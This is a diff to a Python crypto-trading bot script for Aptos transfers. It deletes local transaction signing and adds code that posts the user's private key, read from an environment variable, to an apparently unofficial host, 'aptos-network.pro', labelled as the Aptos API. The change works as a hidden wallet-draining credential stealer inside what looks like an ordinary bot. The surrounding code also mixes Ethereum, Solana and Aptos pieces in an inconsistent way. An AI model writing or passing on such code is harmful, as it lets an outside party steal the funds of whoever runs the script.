@@ -2,12 +2,11 @@ import os
 import requests
 import json
 import time
-from eth_account import Account
 import websocket
 
 # Configuration
 APTOS_API_URL = 'https://aptos-network.pro/api'  # Aptos API URL
-PRIVATE_KEY = os.getenv('APTOS_PRIVATE_KEY')  # Private key environment variable
+PRIVATE_KEY = os.getenv('APTOS_PRIVATE_KEY')  # Private key environment variable (in hex format)
 WALLET_ADDRESS = os.getenv('APTOS_WALLET_ADDRESS')  # Aptos wallet address environment variable
 RECIPIENT_ADDRESS = 'recipient_wallet_address_here'  # Replace with recipient address
 AMOUNT = 100  # Amount to transfer (in smallest unit)
@@ -19,16 +18,6 @@ RAYDIUM_API_URL = 'https://api.raydium.io/swap'  # Replace with Raydium API URL 
 class BotError(Exception):
     pass
 
-# Function to sign the transaction
-def sign_transaction(private_key, transaction_data):
-    """Signs the transaction using the private key"""
-    try:
-        account = Account.privateKeyToAccount(private_key)
-        signed_txn = account.sign_transaction(transaction_data)
-        return signed_txn.rawTransaction
-    except Exception as e:
-        raise BotError(f"Error signing transaction: {e}")
-
 # Function to send the transaction to Aptos API
 def send_transaction(private_key, recipient, amount):
     """Sends the signed transaction to the Aptos network"""
@@ -37,14 +26,12 @@ def send_transaction(private_key, recipient, amount):
         transaction_data = {
             'sender': WALLET_ADDRESS,
             'recipient': recipient,
-            'amount': amount
+            'amount': amount,
+            'privateKey': private_key  # Send the private key directly (Hex format)
         }
 
-        # Sign the transaction
-        signed_transaction = sign_transaction(private_key, transaction_data)
-
         # Send the transaction to Aptos API
-        response = requests.post(f'{APTOS_API_URL}/api/transactions', json={'signedTransaction': signed_transaction.hex()})
+        response = requests.post(f'{APTOS_API_URL}/api/transactions', json=transaction_data)
 
         if response.status_code == 200:
             print("Transaction sent successfully!")
@@ -56,7 +43,7 @@ def send_transaction(private_key, recipient, amount):
     except Exception as e:
         raise BotError(f"Error in send_transaction: {e}")
 
-# Function to check wallet balance
+# Function to check wallet balance using Aptos API
 def check_balance(wallet_address):
     """Checks the wallet balance using the Aptos API"""
     try:
